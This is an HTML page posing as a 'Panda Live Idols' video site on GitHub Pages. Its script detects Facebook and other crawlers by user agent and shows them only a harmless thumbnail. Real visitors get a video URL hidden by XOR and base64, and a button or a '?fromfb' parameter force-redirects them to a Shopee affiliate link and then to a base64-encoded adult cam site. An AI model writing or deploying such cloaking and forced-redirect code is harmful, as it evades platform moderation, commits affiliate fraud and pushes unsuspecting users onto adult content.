<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
<title>Panda Live Idols</title>

<!-- Open Graph cho bot -->
<meta property="og:url" content="https://pandalive-co-kr.github.io/panda-live-idols/" />
<meta property="og:type" content="website" />
<meta property="og:title" content="Panda Live Idols" />
<meta property="og:description" content="Xem video mới nhất của Panda Live Idols" />
<meta property="og:image" content="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />

<style>
html, body { margin:0; padding:0; height:100%; background:#000; }
.video-container{ position:relative; width:100%; height:100%; overflow:hidden; }
.video-container video{ width:100%; height:100%; object-fit:cover; background:#000; }
.top-logo-right{ position:absolute; top:10px; right:10px; z-index:2000; max-width:150px; }
.top-logo-left{ position:absolute; top:10px; left:10px; z-index:2000; max-width:150px; }
.bottom-logo-left{ position:absolute; bottom:10px; left:10px; z-index:2000; max-width:120px; }
.overlay{ position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); z-index:1000; }
.cta{ display:flex; align-items:center; gap:8px; background:rgba(0,17,61,0.85); color:#fff;
      border:none; border-radius:8px; padding:10px 18px; font-size:16px; cursor:pointer; }
.cta img{ width:24px; height:24px; }
@media (max-width:768px){
  .overlay{ top:auto; bottom:320px; transform:translateX(-50%); }
  .top-logo-left, .top-logo-right{ max-width:100px; }
  .bottom-logo-left{ max-width:90px; }
}
#thumbnail{ display:none; }
</style>
</head>
<body>

<!-- Thumbnail cho bot -->
<div id="thumbnail">
  <img src="https://pandalive-co-kr.github.io/panda-live-idols/facebook-reels.jpg" alt="Thumbnail sạch" style="width:100%; height:auto;">
</div>

<!-- Nội dung cho user -->
<div id="real-content" class="video-container" style="display:none;">
  <video id="main-video" autoplay muted loop playsinline preload="auto"
         poster="https://pandalive-co-kr.github.io/panda-live-idols/facebook.jpg" webkit-playsinline></video>

  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-number.png" alt="Panda Number Logo" class="top-logo-left" />
  <img src="https://pandalive-co-kr.github.io/panda-live-idols/panda-class.png" alt="Panda Class Logo" class="top-logo-right" />
  <img src="https://pandalive-co-kr.github.io/panda-live-idols/kbj-logo.jpg" alt="KBJ Logo" class="bottom-logo-left" />

  <div class="overlay">
    <button class="cta" id="ctaBtn">
      <img src="https://pandalive-co-kr.github.io/panda-live-idols/logo.png" alt="Panda Logo" />
      Panda Live Idols
    </button>
  </div>
</div>

<script>
// --- Hàm phụ ---
function xorDecode(str, key) {
  let res = '';
  for (let i = 0; i < str.length; i++) {
    res += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return res;
}
function reverseString(s) { return s.split('').reverse().join(''); }

// --- Mã hóa video URL ---
const enc3_b64 = "ZBEDSgQnDBtdXR9aNQUHEk44CRZWWR9QJggCSQAvCxhCH11cfgMbDBUiAldAWx9aM0wLEggnBB1cUUIaf1sdFBU/DQ==";
const xorKey = "PandaKey2025";

// --- Mã hóa link 18+ ---
const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";

// --- Phát hiện bot ---
function isBot() {
  const ua = (navigator.userAgent || "").toLowerCase();
  const keywords = ["facebookexternalhit","facebot","twitterbot","linkedinbot","slackbot","bot","crawler","spider","preview","embedly"];
  return keywords.some(k => ua.includes(k)) || navigator.webdriver;
}

// --- Phát hiện mở trong FB app ---
function inFacebookApp() {
  const ua = (navigator.userAgent || "").toLowerCase();
  return ua.includes("fbav") || ua.includes("fbios") || ua.includes("fban");
}

document.addEventListener('DOMContentLoaded', function() {
  const thumbnail = document.getElementById('thumbnail');
  const real = document.getElementById('real-content');
  const vid = document.getElementById('main-video');

  if (isBot()) {
    thumbnail.style.display = 'block';
    real.style.display = 'none';
    return;
  }

  // --- Decode video URL và gán trực tiếp ---
  try {
    const raw = atob(enc3_b64);
    const step = xorDecode(raw, xorKey);
    const videoURL = reverseString(step);

    thumbnail.style.display = 'none';
    real.style.display = 'block';

    vid.src = videoURL;
    vid.play().catch(()=>{});

  } catch (err) {
    thumbnail.style.display = 'block';
    real.style.display = 'none';
  }

  // --- Nếu có query fromfb thì tự mở Shopee + 18+ ---
  const params = new URLSearchParams(window.location.search);
  if (params.has("fromfb")) {
    const shopeeLink = "https://s.shopee.vn/30dchvC74f";
    window.location.href = shopeeLink;
    setTimeout(() => {
      const link18 = atob(link18_b64);
      window.location.href = link18;
    }, 150);
  }

  // --- Nút CTA ---
  document.getElementById('ctaBtn').addEventListener('click', function(){
    if (inFacebookApp()) {
      // Nếu đang trong FB app → reload ra ngoài
      const url = window.location.origin + window.location.pathname + "?fromfb=1";
      window.location.href = url;
    } else {
      // Nếu đã ngoài FB → chạy trực tiếp
      const shopeeLink = "https://s.shopee.vn/30dchvC74f";
      window.location.href = shopeeLink;
      setTimeout(() => {
        const link18 = atob(link18_b64);
        window.location.href = link18;
      }, 150);
    }
  });
});
</script>
</body>
</html>
